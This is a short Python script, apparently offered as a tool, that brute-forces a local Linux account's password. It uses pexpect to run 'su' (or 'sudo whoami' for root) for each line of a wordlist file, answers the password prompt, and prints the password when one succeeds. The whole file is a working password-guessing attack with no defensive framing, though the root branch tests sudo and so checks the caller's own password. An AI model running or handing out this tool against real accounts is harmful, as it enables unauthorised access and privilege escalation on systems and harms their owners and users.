import pexpect, sys, argparse



def iteration(password,username):
    # spawn a root shell with sudo or su depending on your linux
    if username== "root":
        proc = pexpect.spawnu("sudo whoami ")
    else :
        proc = pexpect.spawnu("su "+username)
    proc.logfile = sys.stdout
    # wait until the programm finds the string Password or password
    # in the shell output
    proc.expect("[Pp]assword")
    # then: send the password to the waiting shell
    proc.sendline(password)

    # wait until the command completed ("#" is part of the next prompt)
    index=proc.expect([username,"failure","Sorry"])
    proc.close()
    if index == 0 :
        return True
    return False



def main():
    parser = argparse.ArgumentParser(description="Brute force user password via call to su")
    parser.add_argument("-u", "--username", help="local user to test",type=str)
    parser.add_argument("-f", "--pass_file", help="file containing the passwords, one per line",type=str)  
    args = parser.parse_args()

    if not args.pass_file:
        print ("you must specify a password file")
        return
    if not args.username:
        print ("you must specify a username")
        return

    with open(args.pass_file,"r") as pass_file:
        for line in pass_file:
            if (iteration(line,args.username)):
                print("found ! the password is: ",line)
                sys.exit()




if __name__ == "__main__" :
    main()    
